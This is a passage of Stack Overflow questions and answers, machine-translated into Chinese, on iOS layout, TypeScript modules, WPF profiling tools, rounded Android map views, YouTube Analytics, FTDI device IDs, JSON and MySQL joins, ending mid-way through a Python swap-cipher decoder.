    NSString* custfirstname = (__bridge_transfer NSString*)ABRecordCopyValue(person,kABPersonFirstNameProperty);

    self.custfirstName.text = custfirstname;

    // Get Customer Last Name
    NSString* custlastname = (__bridge_transfer NSString*)ABRecordCopyValue(person,kABPersonLastNameProperty);

    self.custlastName.text = custlastname;

    // Get Customer Organization
    NSString* custorganization = (__bridge_transfer NSString*)ABRecordCopyValue(person,kABPersonOrganizationProperty);

    self.custOrganization.text = custorganization;

    //Get Customer Email Address
    NSString* custemail = nil;
    ABMultiValueRef custemailAddresses = ABRecordCopyValue (person,kABPersonEmailProperty);

    if (ABMultiValueGetCount(custemailAddresses) > 0)
    {
        custemail = (__bridge_transfer NSString*)ABMultiValueCopyValueAtIndex(custemailAddresses, 0);

    } else
    {
        custemail = @"[None]";

    }
    self.custEmail.text = custemail;
    CFRelease(custemailAddresses);

    // Get Customer Phone Number
    NSString* custphone = nil;
    ABMultiValueRef phoneNumbers = ABRecordCopyValue (person,kABPersonPhoneProperty);

    if (ABMultiValueGetCount(phoneNumbers) > 0)
    {
        custphone = (__bridge_transfer NSString*)ABMultiValueCopyValueAtIndex(phoneNumbers, 0);

    } else
    {
        custphone = @"[None]";

    }
    self.custphoneNumber.text = custphone;
    CFRelease(phoneNumbers);

bundle:nil;

//[self.navigationController pushViewController:tempExamInfoView animated:YES];
}

@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T00:42:18.810

对于地址数据为空的问题，我没有答案。

要摆脱“本地声明隐藏实例变量”警告，您需要使用不与您正在合成的属性名称冲突的不同变量名称。

例如，在`displayPerson:`你有一个局部变量`custfirstname`。因为它使用与属性相同的名称，所以局部变量隐藏了正在合成的同名实例变量。

如果您想保留局部变量名称，我相信也可以告诉它为`@synthesize`它生成的实例变量使用不同的名称。我不熟悉语法，所以如果你想这样做，你必须自己查一下。

# ios - 让我的应用支持 iPhone 5

> ID：14469199
> 
> 赞同：0
> 
> 时间：2013-01-22T22:25:57.633
> 
> 标签：ios, xcode, ios6, autolayout

我无法让我的应用程序在 iphone 5 上看起来不错，甚至无法合理展示，这真是一团糟。我不知道从哪里开始。滚动视图位于随机位置，应用底部有一个灰色条。我试图通过在情节提要中移动东西来使其工作，但这会破坏旧屏幕。我也打开了自动布局，但是该应用程序在 ios5 上无法运行。任何帮助将不胜感激。干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:34:47.457

一般来说，如果您的弹簧和支柱（或弹簧`UIAutoresizingMask`）设置正确，那么为 iPhone 5 启动应该不会有太多额外的工作。此外，如果您使用诸如 之类的代码行`[someView setFrame:CGRectMake(hardCodedX, hardCodedY, hardCodedWidth, hardCodedHeight)];`，那么您只是在为失败做好准备。您需要重构此代码以使用相对于设备（或 superView）屏幕尺寸的位置。对于无法使用弹簧和支柱完成的复杂子视图布局，您可以`layoutSubviews`在那里覆盖并进行复杂的设置。

如您所说，如果您支持 iOS 5，则不能选择自动布局。

您可以在 Storyboard 中找到弹簧/支柱。我在这里用红色勾勒出来： ![在此处输入图像描述](../Images/94c52c2f097f8f6281eda9807dc6c23b.png)

如果您将鼠标悬停在带有各种工字梁的框上，您可以模拟所选视图将如何调整大小（您将看到框右侧的图像随着它的增长和缩小而动画）。

为每个单独的视图设置了弹簧和支柱。这些可以使用自动调整大小的蒙版以编程方式设置。对于盒子两侧的 4 根工字梁，实线基本上表示“将视图锚定在此位置”。对于中间的两个垂直条，实线表示“视图在这个方向上是灵活的”（无论是宽度还是高度）。

**弹簧和支柱都是相对于视图的超级视图。**

例如，如果您希望您的视图锚定到其父视图的顶部，但随着其父视图的增长而增加其高度（例如，如果屏幕比 iPhone 5 更高，视图控制器的主视图会增长），您会希望顶部的工字梁是实线（将我锚定到顶部），并且盒子内的垂直线是实线（让我的高度与我的超级视图一起增长）。现在，当您将鼠标悬停在该框上时，您会看到右侧的图像已固定其顶部，但在垂直方向上会增大和缩小。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:53:28.013

一般来说，让您的应用程序在新的 iPhone 5 屏幕上呈现出来是很容易的。即使没有一点代码，也可以在使用情节提要时通过几个简单的步骤来完成。

1.  不要紧张
2.  如果您想保持向后兼容性（iOS 5 及更低版本），请确保在文件检查器中禁用自动布局：
    ![禁用自动布局](../Images/36194a806f2c905ada27d362185e8d86.png)
3.  [在您的uiviewcontroller](/questions/tagged/uiviewcontroller "显示标记为“uiviewcontroller”的问题") / storyboard 中选择一个需要为 iPhone 5 屏幕调整大小的项目。然后选择尺寸检查器：
    ![尺寸检查器](../Images/7913273774bec9698654f2582dcdb696.png)
4.  请注意标题为“Autosizing”的带有红线的白框（我相信这些是[jrnstone 所指](https://stackoverflow.com/a/14469311/814730)的弹簧/支柱）。
5.  点击外框的红线会告诉iOS在屏幕大小不同或方向改变时如何对齐对象。内框将告诉 iOS 如何调整对象的大小。示例框显示该对象的大小。
6.  Xcode 还允许您通过单击 Storyboard Editor 右下角的 Form Factor 按钮来预览您的应用程序在不同屏幕尺寸上的外观：
    ![在此处输入图像描述](../Images/d01b8d7d630a7473df05701efa15b037.png)

# typescript - TypeScript 有无类型的外部模块吗？

> ID：14469204
> 
> 赞同：1
> 
> 时间：2013-01-22T22:26:24.020
> 
> 标签：typescript

换句话说，我可以在（最初）不关心其类型的情况下导入外部 JavaScript 模块吗？

在伪 TypeScript 中：

```
declare module "foo": any;
import foo = module("foo");
foo.bar;
foo.baz(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:35:38.367

是的，你可以 - 虽然不是专门作为一个模块：

```
declare var foo : any;
foo.bar;
foo.baz(); 
```

由于您没有以任何方式定义模块，这应该就足够了。

**更新**

如果要`require`生成语句，则需要在`foo.d.ts`文件中进行更强大的定义。我通常会推荐`require: any`你试图避免的黑客攻击。

# wpf - 在哪里可以下载适用于 Windows 8 的 WPF 性能套件

> ID：14469206
> 
> 赞同：28
> 
> 时间：2013-01-22T22:26:30.837
> 
> 标签：wpf, .net-4.0, windows-8

WPF 性能套件描述如下：

[http://msdn.microsoft.com/en-us/library/aa969767.aspx#installing_the_wpf_performance_suite](http://msdn.microsoft.com/en-us/library/aa969767.aspx#installing_the_wpf_performance_suite)

-> 如何在 Windows 8 上安装它？

（无法安装 Windows 7 SDK，并且 Windows 8 SDK 包含诸如 GPUView 之类的性能工具，但不包含 WPF 分析器“Perforator”和“Visual Profiler”。

我用谷歌搜索了几个小时，但没有找到任何东西。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2013-06-03T18:57:51.137

好的，我让它在 Windows 8 下运行，但 afaik 仅适用于框架 4。

[下载工具](http://download.microsoft.com/download/A/6/A/A6AC035D-DA3F-4F0C-ADA4-37C8E5D34E3D/setup/WinSDKPerformanceToolKit_amd64/wpt_x64.msi)（从上面的 Athari 借来的链接）

安装并测试。选择视觉分析器并附加到进程。如果它似乎不起作用，请[从 MS 下载此补丁](http://www.microsoft.com/en-us/download/confirmation.aspx?id=21042)。

安装补丁后，我现在让它再次工作。这是在基于戴尔 XPS 17 i7 的机器上运行的 Windows 8 pro 上。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-22T22:59:17.800

它作为 Windows 8 的 Windows 性能工具包 (WPT) v5 包提供 [http://social.msdn.microsoft.com/Forums/en-US/wptkv5/thread/090ed47a-f253-4c5a-8dc8-a7923e839815](http://social.msdn.microsoft.com/Forums/en-US/wptkv5/thread/090ed47a-f253-4c5a-8dc8-a7923e839815)

这是下载

[http://www.microsoft.com/en-us/download/details.aspx?id=30652](http://www.microsoft.com/en-us/download/details.aspx?id=30652)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2017-07-12T12:40:44.490

我设法下载了所有内容并`Windows 10`使用`.NET 4.5 WPF app`.

*   按照 Microsoft 在[哪里下载 WPF 性能套件？（穿孔器，视觉分析器）](https://blogs.msdn.microsoft.com/kirillosenkov/2016/04/05/where-to-download-wpf-performance-suite-perforator-visual-profiler/)。您需要同时安装该应用程序及其时区补丁。
*   `before`您必须运行运行目标应用程序的 WPF 配置文件应用程序。
*   尝试将目标应用程序运行为`Administrator`. 它需要提升的权限，否则它不会出现在`Select Process`对话框中。
*   如果您无法将目标应用程序作为 运行`Administrator`，那么您仍然可以使用 `Actions..Launch Process`它来启动它。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-02-11T16:53:56.353

Visual Studio 2015 带有“时间轴”，据我估计，它提供了与 Visual Profiler 大致相同的功能。它可以在 .net4+ 上分析 WPF，包括 4.5、4.6。

它可以通过以下方式启动

> 要在 Visual Studio 2015 CTP 5 中分析 WPF 应用程序，请从“调试”->“启动诊断工具而不进行调试”(ALT+F2) 菜单中打开“性能和诊断”中心。选择 Application Timeline 工具并单击 Start（您也可以在 Application Timeline 工具旁边运行 CPU Usage 工具）。

（来源：[https](https://blogs.msdn.microsoft.com/wpf/2015/01/16/new-ui-performance-analysis-tool-for-wpf-applications/) ://blogs.msdn.microsoft.com/wpf/2015/01/16/new-ui-performance-analysis-tool-for-wpf-applications/ ）

# android - 有没有办法为 Mapfragment 实现圆角？

> ID：14469208
> 
> 赞同：14
> 
> 时间：2013-01-22T22:26:39.497
> 
> 标签：android, android-layout, android-maps-v2

我想给地图一个漂亮的圆角，因为它下面的两个框有。我不能用它自己的地图片段来做到这一点，因为片段没有背景属性。将地图设置在布局内并将其背景设置为圆形也对我没有帮助，结果如下：

![http://i.stack.imgur.com/LJhP1.jpg](../Images/c6b041a827d484afe661a7b88e3a5a8a.png)

我可以合并地图，但这会使它变小，我想避免它。

编辑：@Ryan 这是新结果#2：

![http://i.stack.imgur.com/69D59.jpg](../Images/60505752c3aee50402c78b3752d0e8e6.png)

我想这还不错，甚至没有靠近其他盒子的角落，但只要多做一点工作，就可以到达附近的某个地方，我只是没有普通的图像编辑器。但现在仍然困扰我的一件事是“位置”文本视图和它自己的地图之间的分离。我可以用其他方式画补丁，以便现在有距离吗？我就是这样做的：

![http://i.stack.imgur.com/1Qx66.png](../Images/34bd8c56463ee9987b0ba8ca376ef705.png)

好吧，我终于想通了：

![http://i.stack.imgur.com/bY4N5.jpg](../Images/e3d30e1253d79f3e53ce318e8e0ed9a6.png)

这是我用于补丁的内容：

![在此处输入图像描述](../Images/2c23e89b79c0617eb8ccfb14cc1f0994.png)

谢谢。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2017-08-30T22:48:13.540

我知道这是一篇旧帖子，但您可以尝试像这样使用卡片：

```
<android.support.v7.widget.CardView
    android:layout_width="300dp"
    android:layout_height="350dp"
    android:layout_gravity="center_horizontal|center_vertical"
    android:layout_marginLeft="10dp"
    android:layout_marginRight="10dp"
    android:layout_marginTop="20dp"
    app:cardCornerRadius="12dp"
    app:cardElevation="12dp">

    <fragment
        android:id="@+id/map"
        android:name="com.google.android.gms.maps.SupportMapFragment"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />
</android.support.v7.widget.CardView> 
```

[![在此处输入图像描述](../Images/fd3f0de38f0921fd7f6a78624c1055ac.png)](https://i.stack.imgur.com/EpBSC.png)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-01-22T22:39:16.970

我还没有尝试过，但我会在 mapView / mapFragment 的顶部放置一个带有圆角和透明中间的视图。

也就是说，将mapFragment和圆角视图放在一个FrameLayout中，同时填充FrameLayout，然后使圆角视图的中间部分透明。

为了进一步说明，您可以按以下布局进行操作：-

```
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent" >

<fragment
    xmlns:map="http://schemas.android.com/apk/res-auto"
    android:id="@+id/mapFragment"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    class="com.google.android.gms.maps.MapFragment" />

<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@drawable/rounded_background"
    android:orientation="vertical" >
</LinearLayout>

</FrameLayout> 
```

rounded_background 是一个带有圆角和透明中间的 9-patch。例如

![rounded_background.9.png](../Images/6aec8758de04229a24483a8c7652f90d.png)

希望有帮助，

瑞安

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-09-14T15:12:50.173

最简单的方法是将地图片段与 ImageView 一起包装在 FrameLayout 中。Imageview 将在地图片段的顶部显示一个圆角矩形。在最简单的形式中，您将看到圆角矩形内的地图片段，其角伸出圆角矩形，因为地图视图本身不是圆角的。为了克服这种视觉上的怪异，只需在地图片段上应用 layout_margin 值。该值应等于矩形的边框宽度。

```
 <FrameLayout
    android:id="@+id/map_container"
    android:layout_width="wrap_content"
    android:layout_height="340dp" >

    <fragment
        android:id="@+id/map"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:layout_margin="3dp"
        android:name="com.google.android.gms.maps.SupportMapFragment"/>

    <ImageView
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:src="@drawable/map_bg_box" />

</FrameLayout> 
```

矩形可绘制被定义为如下的 xml 形状

```
<?xml version="1.0" encoding="UTF-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android">

    <stroke android:width="3dp"
    android:color="#ff000000" />

    <corners android:bottomRightRadius="7dp" android:bottomLeftRadius="7dp"
    android:topLeftRadius="7dp" android:topRightRadius="7dp"/>

</shape> 
```

请注意，矩形的笔触宽度是 3dp，这与我们应用于地图片段的 layout_margin 属性的值完全相同。结果是一个漂亮的圆角地图片段，如下面的屏幕截图所示 [![在此处输入图像描述](../Images/734fb8d4a37f89b3ee4a5dd62351f693.png)](https://i.stack.imgur.com/ze0dl.png)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2017-03-13T01:56:33.830

将地图片段包装在此布局中：

```
package com.example.yourpackage;

import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.RectF;
import android.util.AttributeSet;
import android.widget.RelativeLayout;

/**
 * Just extend any Layout you like/need
 */
public class RoundedLayout extends RelativeLayout {

private Path mPathCorners = new Path();
private Path mPathCircle = new Path();
private float mCornerRadius;

/**
 * border path
 */
private Path mPathCornersBorder = new Path();
private Path mPathCircleBorder = new Path();
private int mBorderWidth = 0;
private int mBorderHalf;
private boolean mShowBorder = false;
private int mBorderColor = 0xFFFF7700;

private float mDensity = 1.0f;

/**
 * Rounded corners or circle shape
 */
private boolean mIsCircleShape = false;

private Paint mPaint = new Paint();

private float dpFromPx(final float px) {
    return px / mDensity;
}

private float pxFromDp(final float dp) {
    return dp * mDensity;
}

public RoundedLayout(Context context) {
    this(context, null);
}

public RoundedLayout(Context context, AttributeSet attrs) {
    this(context, attrs, 0);
}

public RoundedLayout(Context context, AttributeSet attrs, int defStyle) {
    super(context, attrs, defStyle);
    mDensity = getResources().getDisplayMetrics().density;
    // just a default for corner radius
    mCornerRadius = pxFromDp(25f);

    mPaint.setAntiAlias(true);
    mPaint.setStyle(Paint.Style.STROKE);
    mPaint.setColor(mBorderColor);
    setBorderWidth(Math.round(pxFromDp(2f)));
}

/**
 * Switch to circle or rectangle shape
 *
 * @param useCircle
 */
public void setShapeCircle(boolean useCircle) {
    mIsCircleShape = useCircle;
    invalidate();
}

/**
 * change corner radius
 *
 * @param radius
 */
public void setCornerRadius(int radius) {
    mCornerRadius = radius;
    invalidate();
}

public void showBorder(boolean show) {
    mShowBorder = show;
    invalidate();
}

public void setBorderWidth(int width) {
    mBorderWidth = width;
    mBorderHalf = Math.round(mBorderWidth / 2);
    if (mBorderHalf == 0) {
        mBorderHalf = 1;
    }

    mPaint.setStrokeWidth(mBorderWidth);
    updateCircleBorder();
    updateRectangleBorder();
    invalidate();
}

public void setBorderColor(int color) {
    mBorderColor = color;
    mPaint.setColor(color);
    invalidate();
}

// helper reusable vars, just IGNORE
private float halfWidth, halfHeight, centerX, centerY;
private RectF rect = new RectF(0, 0, 0, 0);
private RectF rectBorder = new RectF(0, 0, 0, 0);

@Override
protected void onSizeChanged(int w, int h, int oldw, int oldh) {
    super.onSizeChanged(w, h, oldw, oldh);

    // just calculate both shapes, is not heavy

    // rounded corners path
    rect.left = 0;
    rect.top = 0;
    rect.right = w;
    rect.bottom = h;
    mPathCorners.reset();
    mPathCorners.addRoundRect(rect, mCornerRadius, mCornerRadius, Path.Direction.CW);
    mPathCorners.close();

    // circle path
    halfWidth = w / 2f;
    halfHeight = h / 2f;
    centerX = halfWidth;
    centerY = halfHeight;
    mPathCircle.reset();
    mPathCircle.addCircle(centerX, centerY, Math.min(halfWidth, halfHeight), Path.Direction.CW);
    mPathCircle.close();

    updateRectangleBorder();
    updateCircleBorder();
}

// helper reusable var, just IGNORE
private int save;

@Override
protected void dispatchDraw(Canvas canvas) {
    save = canvas.save();
    canvas.clipPath(mIsCircleShape ? mPathCircle : mPathCorners);
    super.dispatchDraw(canvas);
    canvas.restoreToCount(save);

    if (mShowBorder) {
        canvas.drawPath(mIsCircleShape ? mPathCircleBorder : mPathCornersBorder, mPaint);
    }
}

private void updateCircleBorder() {
    // border path for circle
    mPathCircleBorder.reset();
    mPathCircleBorder.addCircle(centerX, centerY, Math.min(halfWidth - mBorderHalf,
            halfHeight - mBorderHalf), Path.Direction.CW);
    mPathCircleBorder.close();
}

private void updateRectangleBorder() {
    // border path for rectangle
    rectBorder.left = rect.left + mBorderHalf;
    rectBorder.top = rect.top + mBorderHalf;
    rectBorder.right = rect.right - mBorderHalf;
    rectBorder.bottom = rect.bottom - mBorderHalf;
    mPathCornersBorder.reset();
    mPathCornersBorder.addRoundRect(rectBorder, mCornerRadius - mBorderHalf, mCornerRadius -
            mBorderHalf, Path.Direction.CW);
    mPathCornersBorder.close();
}
} 
```

在布局中会是这样的：

```
<com.example.yourpackage.RoundedLayout
    android:id="@+id/maplayout"
    android:layout_width="match_parent"
    android:layout_height="200dp"
    android:layout_margin="20dp">

    <fragment
        android:id="@+id/map"
        android:name="com.google.android.gms.maps.SupportMapFragment"
        android:layout_width="match_parent"
        android:layout_height="200dp"
        tools:context="com.example.yourpackage.MapsMarkerActivity"/>
</com.example.yourpackage.RoundedLayout> 
```

对于带边框的圆形，在代码中可以是这样的：

```
 RoundedLayout rl = (RoundedLayout) findViewById(R.id.maplayout);
    rl.setShapeCircle(true);
    rl.showBorder(true);
    rl.setBorderWidth(2); 
```

此布局可用于塑造任何视图。

令人难以置信的是，谷歌无法为其 android API 制作有能力（可用）的完整演示。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-11-14T09:01:20.513

对于其他研究这个问题的人，我只是使用 GoogleMap.snapshot 解决了这个问题，并使用这个堆栈溢出来操作位图结果答案： [如何制作带有圆角的 ImageView？](https://stackoverflow.com/questions/2459916/how-to-make-an-imageview-to-have-rounded-corners)

请注意，这仅在您将拥有一个不会与之交互的静态地图时才有效。

确保在加载地图后拍摄快照。

我更新了图像视图帮助器代码以使用路径绘制以支持仅对某些角进行舍入。IE。如果您只想圆角中的 2 个。

您只需要采用 float[] 的 path round rect 函数

我会显示一个进度条，直到我从 GoogleMap 加载的侦听器收到回调，而不是拍摄快照。

如果您过早拍摄快照，您将无法创建宽度和高度为 0 的位图错误。

希望这有助于在静态地图快照中寻找圆角或其他奇怪形状的人。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-07T19:26:14.380

如果您只是尝试以 API 21 (Lollipop) 及更高版本为目标

* * *

这是最简单的方法。

`parentView.setClipToOutline(true);`

**结果**

[![在此处输入图像描述](../Images/739aaf888b01cc51570cf7289419e8f8.png)](https://i.stack.imgur.com/rFqF0.png)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2017-07-26T08:52:31.493

在@Nouman_Hanif 发布之后，我最终得到了一个看起来相当不错的解决方案。

map_rounded_corner_overlay.xml：

```
<?xml version="1.0" encoding="UTF-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android">
  <stroke android:width="1dp"
          android:color="@color/white" />
  <corners android:radius="<your_desired_view_corner_radius>"/>
</shape> 
```

我的地图 xml 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
                android:layout_width="match_parent"
                android:layout_height="match_parent">
  <fragment
    android:id="@+id/map"
    android:name="com.google.android.gms.maps.SupportMapFragment"
    android:layout_margin="1dp"
    android:layout_width="match_parent"
    android:layout_height="match_parent" />
  <ImageView
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:src="@drawable/map_rounded_corner_overlay" />
</RelativeLayout> 
```

# youtube - youtube 分析服务报告参数

> ID：14469216
> 
> 赞同：0
> 
> 时间：2013-01-22T22:27:05.720
> 
> 标签：youtube

我正在向谷歌进行身份验证以尝试获取 youtube 分析我的问题是我不知道如何在查询 youtube 时为您填写参数我正在制作一项新服务：然后尝试查询它

我不确定在“ids”参数中放置什么或在哪里找到它？我在那儿放什么？

_analyticService = new YoutubeAnalyticsService(_authenticator = CreateAuthenticator()); ... _analyticService.Reports.Query("ids", "2013-01-01", "2013-02-02", "views").Fetch();

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T00:02:42.473

ids 参数是一个带有频道 ID 的表达式。如果您访问[http://www.youtube.com/analytics](http://www.youtube.com/analytics)并单击带有您自己频道名称的标题，您会得到一个类似[http://www.youtube.com/channel/UCYHMS8hN8s49F93iJuEgG6w](http://www.youtube.com/channel/UCYHMS8hN8s49F93iJuEgG6w)的链接 最后一部分是 id您的频道。您必须在“channel==UCYHMS8hN8s49F93iJuEgG6w”之类的表达式中将其用作 ids 参数。这是在您自己的频道的上下文中进行查询。这是必需的，因为您可能可以访问多个频道。

我可以通过以下方式查询我的一个视频的观看次数：[https ://www.googleapis.com/youtube/analytics/v1/reports?ids=channel%3D%3DUCYHMS8hN8s49F93iJuEgG6w&start-date=2013-01-01&end-date=2013-02 -02&metrics=views&dimensions=day&filters=video%3D%3D_iwmv6644dA&sort=day&key=](https://www.googleapis.com/youtube/analytics/v1/reports?ids=channel%3D%3DUCYHMS8hN8s49F93iJuEgG6w&start-date=2013-01-01&end-date=2013-02-02&metrics=views&dimensions=day&filters=video%3D%3D_iwmv6644dA&sort=day&key=) {YOUR_API_KEY}

尝试使用此页面底部的 API 资源管理器，那里也有一些解释不同参数的文本。[https://developers.google.com/youtube/analytics/v1/](https://developers.google.com/youtube/analytics/v1/)

希望一切顺利！

# macos - 根据总线位置 ID 打开 FTDI 设备

> ID：14469218
> 
> 赞同：2
> 
> 时间：2013-01-22T22:27:08.277
> 
> 标签：macos, ftdi

我有几个 FTDI 设备连接到我的 Mac。它们都具有相同的描述、PID 和 VID。我希望能够向 FT_OpenEx() 指定我要打开哪一个。

我可以使用 IO Kit API 来获取我感兴趣的设备的总线位置 ID。FT_OpenEX() API 允许我传递位置而不是描述或序列号。

但是，返回位置 ID 的 FT API 返回的值与公交车位置 ID 完全不同。我连接的其中一个设备的总线位置 ID 为 0x1a127000，当我使用 FT API 获取所有设备的位置时，总线会显示 0x1a051 和 0x1a052 之类的内容。

有没有办法从 IO Kit 总线位置 ID 和 FT 位置进行转换，或者以其他方式指定要使用的设备？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-07T07:38:37.383

我最近遇到了类似的问题：在某些位置和设备上，我得到 0 作为位置 ID。我写了一份向 FTDI 寻求帮助的请求，这就是我得到的：

> 我们测试了 USB 3.0 主机 PCI 卡，发现它与我们的驱动程序不兼容，原因如下。
> 
> Windows 机器上的现有主机端口按以下格式命名：\device\usbfdo-# 其中# 是一个数字。
> 
> USB 3.0 卡称为\device\device#，其中# 是一个数字。
> 
> USB 3.0 主机端口不遵循 Windows 机器上的标准命名约定，我们在枚举和尝试加载驱动程序时不会尝试打开此端口来发送设备 ID。
> 
> 由于我们希望 Microsoft 在添加对 3.0 的支持时遵循惯例，因此我们希望问题会远离我们的观点。因此，我们仍然认为问题在于 3.0 主机而不是我们的驱动程序。
> 
> 即使可以进行更改以支持此主机控制器，您尝试的下一个主机设备（不同的制造商）也很可能有另一个需要不同修改的变体。这将不是一个可持续的模式，并且违背了 USB 的 PnP 精神。
> 
> 我们相信这个问题已经在 Windows 8 中得到解决。我们目前正在努力对我们的新 Windows 8 驱动程序进行认证，我预计这将在 2 月底推出。

这不是很令人满意，但至少它描述了它为什么不起作用。当我有时间时，我会尝试使用 libusbX 获取位置 ID，然后使用 FTDI API 例程打开它。不知道那会是什么时候，虽然......

维特

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-22T13:31:41.957

由于我已经为 linux 做过一次并且有一个可行的解决方案，所以我想我也会尝试为 mac 解决这个问题。我不确定我是否正确地做到了这一点，但这是我想出的：

基本上，您将 MacOSX 位置 ID 右移 16 位，二进制和 0xff00 并添加设备地址。这应该等于您从 ftdi 驱动程序获得的位置 ID。

示例：
在“系统信息”程序中，我可以找到我的 USB 设备并看到如下内容：

```
Location ID:    0x14100000 / 21 
```

那似乎是“位置ID/设备号”。现在将其代入该公式：

```
0x141000000>>16 = 0x1410
0x1410&0xff00   = 0x1400
0x1400|21       = 0x1415 
```

所以以十进制表示，位置 id 是：5141，它与 FTDI 返回的内容相匹配。请注意，上面使用的 21 是十六进制的 0x15。

我在 30 分钟前才发现这一点，所以如果这个实现有问题，请告诉我。我也需要它可靠地工作。我尝试在 mac 和设备之间放置一个集线器，但公式仍然适用。

IOKit 调用是：

```
kr = (*dev)->GetLocationID(dev, &locationid);
kr = (*dev)->GetDeviceAddress(dev, &address); 
```

在[苹果开发者参考](https://developer.apple.com/library/mac/documentation/IOKit/Reference/IOUSBDeviceInterface_reference/translated_content/IOUSBDeviceInterface.html#//apple_ref/doc/uid/TP40011529-CLSCHIOUSBDeviceInterface-SW11)网站上描述。

**编辑** ，因为您的 FTDI 位置 ID 中有 5 位数字，所以我会对您的设备设备号感兴趣。也许我的方法在你的情况下不成立？

# mysql - 如何在 Sequel Pro TEXT 编辑器中创建 JSON 字符串？

> ID：14469221
> 
> 赞同：0
> 
> 时间：2013-01-22T22:27:18.470
> 
> 标签：mysql, json, actionscript-3, amfphp, sequelpro

我认为这可能是创建 JSON 字符串的非常规方式。但是，我真的需要像这样在“Sequel Pro”中做到这一点

![在此处输入图像描述](../Images/3e21088fefb895c820ed17bd43fa0ec9.png)

我希望能够像那样编辑它。但是当我在客户端收到字符串，然后尝试在其上使用 as3 JSON.parse 函数时，它会出现错误......`"SyntaxError: Error #1132: Invalid JSON parse input."`

```
 private function storyTextCallBack(r:Object):void
            {

                        //storyText is an 'Object'
                storyText = JSON.parse(r.text);

            } 
```

但这就是我的客户实际得到它的方式，我认为这就是破坏 JSON.parse 函数的原因.....

```
 [\n\t{\n\t\ttext: "hello this is some json test stuff",\n\t\tduration: "5000"\n\t},\n\t{\n\t\ttext: "this is the second line in that json object thing",\n\t\tduration: "3000"\n\t},\n\t{\n\t\ttext: "this is the third and final line in that json object thing",\n\t\tduration: "8000"\n\t}\n] 
```

有人知道我该如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:55:36.647

JSON 中的对象名称需要在引号内：

```
"text":"example text" 
```

您可以使用此解析器检查您是否有有效的 JSON 对象：http: [//json.parser.online.fr](http://json.parser.online.fr)

# mysql - 保留行，即使它们在其他连接表 MySQL Query 中没有任何行

> ID：14469226
> 
> 赞同：1
> 
> 时间：2013-01-22T22:27:42.243
> 
> 标签：mysql, sql

```
 SELECT `products`.*, SUM(orders.total_count) AS revenue, SUM(orders.quantity) AS qty FROM `products` 
    LEFT JOIN `orders` ON (`products`.`id` = `orders`.`product_id`) 
    WHERE (`orders`.`status` = 'delivered' OR `orders`.`status` = 'new') 
    GROUP BY `products`.`ID` ORDER BY products.ID DESC LIMIT 10 OFFSET 0 
```

这就是我得到的。目前它只抓取具有已交付或新订单的产品。

该 WHERE 语句仅用于正确计算 SUM(orders.total_count) 和 SUM(orders.quantity) -

我想抢所有的产品，如果有这个产品的订单，那么它应该查看 where 声明，以确保我们抢的订单是新的或已交付的。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T22:29:50.673

简短的回答是更改`WHERE`为`AND`.

实际上，这意味着“ `orders.status`”列上的谓词需要在`ON`子句中，而不是`WHERE`子句中。

在您的查询中，该谓词相当于一个“ `orders.status IS NOT NULL`”，它将“抛出”由 LEFT JOIN 创建的任何 NULL 行。

考虑 LEFT (OUTER) JOIN 的最简单方法是，当没有其他匹配的“订单”行时，它会创建一个虚拟“订单”行以匹配“产品”行。该虚拟行由所有 NULL 值组成。

# python - Python 翻转密码

> ID：14469227
> 
> 赞同：0
> 
> 时间：2013-01-22T22:27:44.043
> 
> 标签：python

对于一个项目，我们必须编写一个程序，其中输入一个关键字和一个字符串，然后程序对其进行编码。例如

弦：但我没想到。关键词：仙境

该程序会将“仙境”拆分为字母表中的位置：

```
WONDERLAND = 23,15,14,4,5,18,12,1,14,4 
```

然后它将位置 1 的字符与位置 23 的字符交换，将位置 2 的字符与位置 15 的字符交换，等等。

'But I didn't think' 会以“'nu n. ithdtBiItdk”的形式出现

我已经能够成功地编码一个字符串，但不能解码它。这是我的代码：

```
def encode(keyword,t):
    key = []
    text = []

    for i in range(len(t)):
        text.append(t[i])

    for i in range(len(keyword)):
        key.append(ord(keyword[i].lower()) - 96)

    keynum = 0
    actnum = 0

    for i in range(len(text)):
        print str(i) + " " + str(text)

        if keynum > len(keyword) - 1:
            keynum = 0

        actnum = key[keynum]

        while (actnum + i) > len(text) - 1:
            actnum = actnum - len(text)

        temp = text[i]
        text[i] = text[i+actnum]
        text[i+actnum] = temp
        keynum += 1

    merged = ""

    for i in range(len(text)):
        merged += text[i]

    return merged

def decode(keyword,t):
    key = []
    text = []

    for i in range(len(t)):
        text.append(t[i])

    for i in range(len(keyword)):
        key.append(ord(keyword[i].lower()) - 96)

